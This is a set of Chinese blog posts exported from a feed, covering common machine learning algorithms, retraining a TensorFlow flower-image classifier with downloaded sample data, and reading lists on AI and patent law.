<p>延伸：KNN 的一个缺点是依赖于整个训练数据集，学习向量量化（Learning Vector Quantization，LVQ)是一种监督学习的人神经网络算法，允许你选择训练实例。LVQ 由数据驱动，搜索距离它最近的两个神经元，对于同类神经元采取拉拢，异类神经元采取排斥，最终得到数据的分布模式。如果基于 KNN 可以获得较好的数据集分类效果，利用 LVQ 可以减少存储训练数据集存储规模。典型的学习矢量量化算法有LVQ1、LVQ2和LVQ3，尤以LVQ2的应用最为广泛。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_Learning_Vector_Quantization.png" alt=""></p>
<h2 id="4-逻辑回归算法-Logistic-Regression"><a href="#4-逻辑回归算法-Logistic-Regression" class="headerlink" title="4. 逻辑回归算法 Logistic Regression"></a>4. 逻辑回归算法 Logistic Regression</h2><p>逻辑回归算法（Logistic Regression）一般用于需要明确输出的场景，如某些事件的发生（预测是否会发生降雨）。通常，逻辑回归使用某种函数将概率值压缩到某一特定范围。<br>例如，Sigmoid 函数（S 函数）是一种具有 S 形曲线、用于二元分类的函数。它将发生某事件的概率值转换为 0, 1 的范围表示。</p>
<blockquote>
<p>Y = E ^（b0＋b1 <em> x）/（1 + E ^（b0＋b1 </em> x ））</p>
</blockquote>
<p>以上是一个简单的逻辑回归方程，B0，B1是常数。这些常数值将被计算获得，以确保预测值和实际值之间的误差最小。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_Logistic_Regression_1.gif" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_Logistic_Regression.jpg" alt=""></p>
<h2 id="5-决策树算法-Decision-Tree"><a href="#5-决策树算法-Decision-Tree" class="headerlink" title="5. 决策树算法 Decision Tree"></a>5. 决策树算法 Decision Tree</h2><p>决策树（Decision tree）是一种特殊的树结构，由一个决策图和可能的结果（例如成本和风险）组成，用来辅助决策。机器学习中，决策树是一个预测模型，树中每个节点表示某个对象，而每个分叉路径则代表某个可能的属性值，而每个叶节点则对应从根节点到该叶节点所经历的路径所表示的对象的值。决策树仅有单一输出，通常该算法用于解决分类问题。</p>
<p>一个决策树包含三种类型的节点：</p>
<ul>
<li>决策节点：通常用矩形框来表示</li>
<li>机会节点：通常用圆圈来表示</li>
<li>终结点：通常用三角形来表示</li>
</ul>
<p>简单决策树算法案例，确定人群中谁喜欢使用信用卡。考虑人群的年龄和婚姻状况，如果年龄在30岁或是已婚，人们更倾向于选择信用卡，反之则更少。<br>通过确定合适的属性来定义更多的类别，可以进一步扩展此决策树。在这个例子中，如果一个人结婚了，他超过30岁，他们更有可能拥有信用卡（100% 偏好）。测试数据用于生成决策树。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_DT.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_DecisionTree.png" alt=""></p>
<p><strong>注意</strong>：对于那些各类别样本数量不一致的数据，在决策树当中信息增益的结果偏向于那些具有更多数值的特征。</p>
<ul>
<li><a href="http://www.hansmelo.com/2017/07/28/decision-trees/">Introduction to Decision Tree</a></li>
<li><a href="https://mp.weixin.qq.com/s/4qQxB4AthVAYKggEV3BHFw">ThunderGBM：快成一道闪电的梯度提升决策树 | 机器之心  3月7日</a></li>
</ul>
<h2 id="6-k-平均算法-K-Means"><a href="#6-k-平均算法-K-Means" class="headerlink" title="6. k-平均算法 K-Means"></a>6. k-平均算法 K-Means</h2><p>k-平均算法(K-Means)是一种无监督学习算法，为聚类问题提供了一种解决方案。<br>K-Means 算法把 n 个点（可以是样本的一次观察或一个实例）划分到 k 个集群（cluster），使得每个点都属于离他最近的均值（即聚类中心，centroid）对应的集群。重复上述过程一直持续到重心不改变。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_KM.png" alt=""></p>
<h2 id="7-随机森林算法-Random-Forest"><a href="#7-随机森林算法-Random-Forest" class="headerlink" title="7. 随机森林算法 Random Forest"></a>7. 随机森林算法 Random Forest</h2><p>随机森林算法（Random Forest）的名称由 1995 年由贝尔实验室提出的random decision forests 而来，正如它的名字所说的那样，随机森林可以看作一个决策树的集合。<br>随机森林中每棵决策树估计一个分类，这个过程称为“投票（vote）”。理想情况下，我们根据每棵决策树的每个投票，选择最多投票的分类。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_RF.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_RandomForest.png" alt=""></p>
<ul>
<li><strong>Paper</strong><a href="https://www.stat.berkeley.edu/~breiman/randomforest2001.pdf">Random Forest |Leo Breiman | Statistics Department  University of California Berkeley</a></li>
</ul>
<h2 id="8-朴素贝叶斯算法-Naive-Bayes"><a href="#8-朴素贝叶斯算法-Naive-Bayes" class="headerlink" title="8. 朴素贝叶斯算法 Naive Bayes"></a>8. 朴素贝叶斯算法 Naive Bayes</h2><p>朴素贝叶斯算法（Naive Bayes）基于概率论的贝叶斯定理，应用非常广泛，从文本分类、垃圾邮件过滤器、医疗诊断等等。朴素贝叶斯适用于特征之间的相互独立的场景，例如利用花瓣的长度和宽度来预测花的类型。“朴素”的内涵可以理解为特征和特征之间独立性强。</p>
<p>与朴素贝叶斯算法密切相关的一个概念是最大似然估计(Maximum likelihood estimation)，历史上大部分的最大似然估计理论也都是在贝叶斯统计中得到大发展。例如，建立人口身高模型，很难有人力与物力去统计全国每个人的身高，但是可以通过采样，获取部分人的身高，然后通过最大似然估计来获取分布的均值与方差。</p>
<blockquote>
<p>Naive Bayes is called naive because it assumes that each input variable is independent.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_Bayes.png" alt=""></p>
<h2 id="9-降维算法-Dimensional-Reduction"><a href="#9-降维算法-Dimensional-Reduction" class="headerlink" title="9. 降维算法 Dimensional Reduction"></a>9. 降维算法 Dimensional Reduction</h2><p>在机器学习和统计学领域，降维是指在限定条件下，降低随机变量个数，得到一组“不相关”主变量的过程，并可进一步细分为特征选择和特征提取两大方法。</p>
<p>一些数据集可能包含许多难以处理的变量。特别是资源丰富的情况下，系统中的数据将非常详细。在这种情况下，数据集可能包含数千个变量，其中大多数变量也可能是不必要的。在这种情况下，几乎不可能确定对我们的预测影响最大的变量。此时，我们需要使用降维算法，降维的过程中也可能需要用到其他算法，例如借用随机森林，决策树来识别最重要的变量。</p>
<h2 id="10-梯度增强算法-Gradient-Boosting"><a href="#10-梯度增强算法-Gradient-Boosting" class="headerlink" title="10. 梯度增强算法 Gradient Boosting"></a>10. 梯度增强算法 Gradient Boosting</h2><p>梯度增强算法（Gradient Boosting）使用多个弱算法来创建更强大的精确算法。它与使用单个估计量不同，而是使用多个估计量创建一个更稳定和更健壮的算法。梯度增强算法有几种：</p>
<ul>
<li>XGBoost  — 使用线性和树算法</li>
<li>LightGBM  — 只使用基于树的算法<br>梯度增强算法的特点是精度较高。此外，LightGBM 算法具有令人难以置信的高性能。</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.economist.com/blogs/economist-explains/2017/08/economist-explains-24?fsrc=scn/tw/te/bl/ed/">媒体报道|经济学人：What are algorithms?</a></li>
<li><a href="https://towardsdatascience.com/a-tour-of-the-top-10-algorithms-for-machine-learning-newbies-dde4edffae11">A Tour of The Top 10 Algorithms for Machine Learning Newbies</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%9B%A3%E7%9D%A3%E5%BC%8F%E5%AD%B8%E7%BF%92">维基百科：监督学习</a></li>
<li><a href="http://www.infoq.com/cn/news/2018/02/ai-engineer-basic-ability?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">AI工程师基础能力：机器学习 | InfoQ</a></li>
<li><a href="https://morvanzhou.github.io/tutorials/machine-learning/reinforcement-learning/">Reinforcement Learning 强化学习 Python 3</a></li>
<li><a href="http://www.infoq.com/cn/articles/teach-you-how-to-read-all-kinds-of-neural-networks?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">教你看懂各种神经网络</a></li>
<li><a href="http://www.asimovinstitute.org/neural-network-zoo/">神经网络架构</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/machine-learning/machine-learning-algorithm-cheat-sheet">微软Azure算法图表</a></li>
<li><a href="http://blogs.sas.com/content/subconsciousmusings/2017/04/12/machine-learning-algorithm-use/">SAS算法图表</a></li>
<li><a href="http://machinelearningmastery.com/a-tour-of-machine-learning-algorithms/">算法总结</a><br><a href="http://thinkbigdata.in/best-known-machine-learning-algorithms-infographic/">http://thinkbigdata.in/best-known-machine-learning-algorithms-infographic/</a>)</li>
<li><a href="https://blog.dataiku.com/machine-learning-explained-algorithms-are-your-friend">算法的优劣对比</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine Learning:Training Models</title>
    <url>/2018/02/27/Machine-Learning-TrainModel/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="Previous"><a href="#Previous" class="headerlink" title="Previous"></a>Previous</h2><p>前文回顾：</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js</a></li>
</ul>
<p>上面的文章中提到了机器学习的预测结果受模型质量的影响很大，如果想要取得好的效果需要通过训练增强优化。</p>
<h4 id="Training-Data"><a href="#Training-Data" class="headerlink" title="Training Data"></a>Training Data</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://download.tensorflow.org/example_images/flower_photos.tgz \| tar xz -C tf_files</span><br></pre></td></tr></table></figure>
<h4 id="Training-the-Network"><a href="#Training-the-Network" class="headerlink" title="Training the Network"></a>Training the Network</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/googlecodelabs/tensorflow-for-poets-2</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python scripts/retrain.py</span><br><span class="line">--image_dir=tf_files/flower_photos</span><br><span class="line">--output_graph=tf_files/retrained_graph.pb</span><br><span class="line">--output_labels=tf_files/retrained_labels.txt</span><br></pre></td></tr></table></figure>
<h4 id="Test-Using-the-Retrained-Model"><a href="#Test-Using-the-Retrained-Model" class="headerlink" title="Test:Using the Retrained Model"></a>Test:Using the Retrained Model</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python scripts/label_image.py --image data/daisy.jpg</span><br></pre></td></tr></table></figure>
<h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">node &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;DecodeJpeg/contents&quot;</span></span><br><span class="line">  <span class="attr">op</span>: <span class="string">&quot;Const&quot;</span></span><br><span class="line">  attr &#123;</span><br><span class="line">    <span class="attr">key</span>: <span class="string">&quot;dtype&quot;</span></span><br><span class="line">    value &#123;</span><br><span class="line">      <span class="attr">type</span>: DT_STRING</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  attr &#123;</span><br><span class="line">    <span class="attr">key</span>: <span class="string">&quot;value&quot;</span></span><br><span class="line">    value &#123;</span><br><span class="line">      tensor &#123;</span><br><span class="line">        <span class="attr">dtype</span>: DT_STRING</span><br><span class="line">        tensor_shape &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attr">string_val</span>: <span class="string">&quot;\377\330.......&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&quot;softmax/biases&quot;</span></span><br><span class="line"><span class="attr">op</span>: <span class="string">&quot;Const&quot;</span></span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;dtype&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line"><span class="attr">type</span>: DT_FLOAT</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;value&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line">tensor &#123;</span><br><span class="line">  <span class="attr">dtype</span>: DT_FLOAT</span><br><span class="line">  tensor_shape &#123;</span><br><span class="line">    dim &#123;</span><br><span class="line">      <span class="attr">size</span>: <span class="number">1008</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="attr">tensor_content</span>: <span class="string">&quot;\312\277\006&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">node &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&quot;softmax/logits/MatMul&quot;</span></span><br><span class="line"><span class="attr">op</span>: <span class="string">&quot;MatMul&quot;</span></span><br><span class="line"><span class="attr">input</span>: <span class="string">&quot;pool_3/_reshape&quot;</span></span><br><span class="line"><span class="attr">input</span>: <span class="string">&quot;softmax/weights&quot;</span></span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;T&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line"><span class="attr">type</span>: DT_FLOAT</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;transpose_a&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line"><span class="attr">b</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;transpose_b&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line"><span class="attr">b</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">node &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&quot;softmax/logits&quot;</span></span><br><span class="line"><span class="attr">op</span>: <span class="string">&quot;BiasAdd&quot;</span></span><br><span class="line"><span class="attr">input</span>: <span class="string">&quot;softmax/logits/MatMul&quot;</span></span><br><span class="line"><span class="attr">input</span>: <span class="string">&quot;softmax/biases&quot;</span></span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;T&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line"><span class="attr">type</span>: DT_FLOAT</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">node &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&quot;softmax&quot;</span></span><br><span class="line"><span class="attr">op</span>: <span class="string">&quot;Softmax&quot;</span></span><br><span class="line"><span class="attr">input</span>: <span class="string">&quot;softmax/logits&quot;</span></span><br><span class="line">attr &#123;</span><br><span class="line"><span class="attr">key</span>: <span class="string">&quot;T&quot;</span></span><br><span class="line">value &#123;</span><br><span class="line"><span class="attr">type</span>: DT_FLOAT</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Optional-Parameters"><a href="#Optional-Parameters" class="headerlink" title="Optional Parameters"></a>Optional Parameters</h4><h4 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22:17:28.523085: W tensorflow/core/platform/cpu_feature_guard.cc:45] The TensorFlow library wasn&#x27;t compiled to use FMA instructions, but these are available on your machine and could speed up CPU computations.</span><br><span class="line">22:17:28 NodeDef mentions attr &#x27;dilations&#x27; not in Op&lt;name=Conv2D; signature=input:T, filter:T -&gt; output:T; attr=T:type,allowed=[DT_HALF, DT_FLOAT]; attr=strides:list(int); attr=use_cudnn_on_gpu:bool,default=true; attr=padding:string,allowed=[&quot;SAME&quot;, &quot;VALID&quot;]; attr=data_format:string,default=&quot;NHWC&quot;,allowed=[&quot;NHWC&quot;, &quot;NCHW&quot;]&gt;; NodeDef: conv/Conv2D = Conv2D[T=DT_FLOAT, data_format=&quot;NHWC&quot;, dilations=[1, 1, 1, 1], padding=&quot;VALID&quot;, strides=[1, 2, 2, 1], use_cudnn_on_gpu=true](Mul, conv/conv2d_params). (Check whether your GraphDef-interpreting binary is up to date with your GraphDef-generating binary.).</span><br><span class="line"></span><br><span class="line">22:22:02.629987: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.2 AVX AVX2 FMA</span><br></pre></td></tr></table></figure>
<h2 id="About-Data-Sets"><a href="#About-Data-Sets" class="headerlink" title="About Data Sets"></a>About Data Sets</h2><ul>
<li><a href="https://towardsdatascience.com/fun-with-small-image-data-sets-part-2-54d683ca8c96">Fun with small image data-sets (Part 2)</a></li>
</ul>
<h2 id="扩展阅读-《The-Machine-Learning-Master》"><a href="#扩展阅读-《The-Machine-Learning-Master》" class="headerlink" title="扩展阅读:《The Machine Learning Master》"></a>扩展阅读:<a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h2><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/J75ZdrNCSwBO1y9o84THQg">综述论文：机器学习中的模型评价、模型选择与算法选择 | 2018-02-02 机器之心</a></li>
<li><a href="https://dev.to/michaeljtaylor0/plug--play-machine-learning-models-in-golang--fc0">Plug &amp; Play Machine Learning Models in GoLang |  BAYESIAN CLASSIFICATION</a></li>
<li><a href="https://hackernoon.com/train-your-machine-learning-models-on-googles-gpus-for-free-forever-a41bd309d6ad">Train Your Machine Learning Models on Google’s GPUs for Free — Forever</a></li>
<li><a href="https://towardsdatascience.com/how-do-we-train-neural-networks-edd985562b73">How do we ‘train’ neural networks ?</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>AI产业资讯：机器学习技术与知识产权法</title>
    <url>/2018/02/16/Machine-Learning-Law/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="判例"><a href="#判例" class="headerlink" title="判例"></a>判例</h2><ul>
<li><a href="http://wenshu.court.gov.cn/content/content?DocID=9680dfb7-d63b-423b-ba86-67231f6d4477">上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://36kr.com/p/5096119.html">专利制度会阻碍科技进步吗？就 AI 领域而言，这一趋势愈加明显</a></li>
<li><a href="https://patents.google.com/patent/CN104866727A/zh">基于深度学习对医疗数据进行分析的方法及其智能分析仪</a></li>
<li><a href="https://patents.google.com/patent/CN103580960A/zh">一种基于机器学习的在线管网异常侦测系统</a></li>
<li><a href="https://patents.google.com/patent/CN106682236A/zh">基于机器学习的专利数据处理方法及其处理系统</a></li>
<li><a href="https://anli.court.gov.cn/static/web/index.html#/alyj/detail/D1281F6B2271C33886E3AD4A5B85A137">人工智能与法律问题初探 | 2017年11月29日 作者: 蔡雄山</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习专题 | Overview of Machine Learning</title>
    <url>/2017/06/19/Machine-Learning/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>机器学习是人工智能的一个分支。机器学习算法提供了一类从数据中自动分析获得规律，并利用规律对未知数据进行预测的方法。机器学习已广泛应用于数据挖掘、计算机视觉、自然语言处理、搜索引擎、医学诊断、证券市场分析、DNA 测序、战略游戏和机器人等诸多领域。</p>
<span id="more"></span>
<h2 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h2><ul>
<li><a href="https://www.jianshu.com/c/e94623c9ea2a">简书专题 |《Machine Learning 小组》</a></li>
</ul>
<p>我正在「Machine Learning」和朋友们讨论有趣的话题，你一起来吧？<a href="https://t.zsxq.com/zFUF2zv">https://t.zsxq.com/zFUF2zv</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-machinelearning.png" alt=""></p>
<h2 id="机器学习导论"><a href="#机器学习导论" class="headerlink" title="机器学习导论"></a>机器学习导论</h2><ul>
<li><a href="https://developers.google.com/machine-learning/rules-of-ml/">机器学习规则 (Rules of Machine Learning)</a></li>
<li><a href="https://riboseyim.github.io/2017/08/30/Mathmetics-Beauty/">读书笔记|数学之美（Beauty Of Mathmetics）</a></li>
<li><a href="https://dev.to/michaeljtaylor0/plug--play-machine-learning-models-in-golang--fc0">Simple EMail Demo | Plug &amp; Play Machine Learning Models in GoLang</a></li>
</ul>
<h2 id="机器学习应用"><a href="#机器学习应用" class="headerlink" title="机器学习应用"></a>机器学习应用</h2><h4 id="Topic：机器学习与自然语言处理-Natural-Language-Processing"><a href="#Topic：机器学习与自然语言处理-Natural-Language-Processing" class="headerlink" title="Topic：机器学习与自然语言处理(Natural Language Processing)"></a><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-Natural-Language/">Topic：机器学习与自然语言处理(Natural Language Processing)</a></h4><ul>
<li>Domain Expert:Professor <a href="http://www.cs.columbia.edu/~mcollins/">Michael Collins</a><br>Professor of Computer Science,Columbia University</li>
<li><a href="http://athenasc.com/probbook.html">Introduction to Probability, 2nd Edition</a><br>ISBN: 978-1-886529-23-6<br>Publication: July 2008, 544 pages, hardcover<br>Price: $91.00</li>
</ul>
<h4 id="Topic：机器学习与计算机图形-视觉处理"><a href="#Topic：机器学习与计算机图形-视觉处理" class="headerlink" title="Topic：机器学习与计算机图形/视觉处理"></a><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Topic：机器学习与计算机图形/视觉处理</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js</a></li>
</ul>
<h4 id="Topics"><a href="#Topics" class="headerlink" title="Topics"></a>Topics</h4><ul>
<li><a href="https://towardsdatascience.com/machine-learning-techniques-applied-to-cyber-security-d58a8995b7d7">Machine Learning Techniques Applied to Cyber Security</a></li>
<li><a href="https://blog.datalore.io/introducing-datalore/">Introducing Datalore - an intelligent web application for machine learning</a></li>
</ul>
<h2 id="Frameworks"><a href="#Frameworks" class="headerlink" title="Frameworks"></a>Frameworks</h2><ul>
<li><a href="https://geekflare.com/ai-frameworks/">Top 9 Frameworks in the World of Artificial Intelligence</a></li>
<li><a href="https://itnext.io/you-can-build-a-neural-network-in-javascript-even-if-you-dont-really-understand-neural-networks-e63e12713a3">You can build a neural network in JavaScript even if you don’t really understand neural networks</a></li>
</ul>
<h2 id="Research"><a href="#Research" class="headerlink" title="Research"></a>Research</h2><ul>
<li><a href="https://stanfordmlgroup.github.io/">Stanford ML Group</a></li>
<li><p><a href="http://ufldl.stanford.edu/tutorial/">Stanford Deep Learning Tutorial</a></p>
</li>
<li><p><a href="https://www.economist.com/news/science-and-technology/21732081-machine-learnings-big-event-all-buzz-ais-big-shindig?fsrc=scn/tw/te/bl/ed/allthebuzzataisbigshindigalgorithmisgonnagetyou">Algorithm is gonna get you | All the buzz at AI’s big shindig | Machine learning’s big event</a></p>
</li>
</ul>
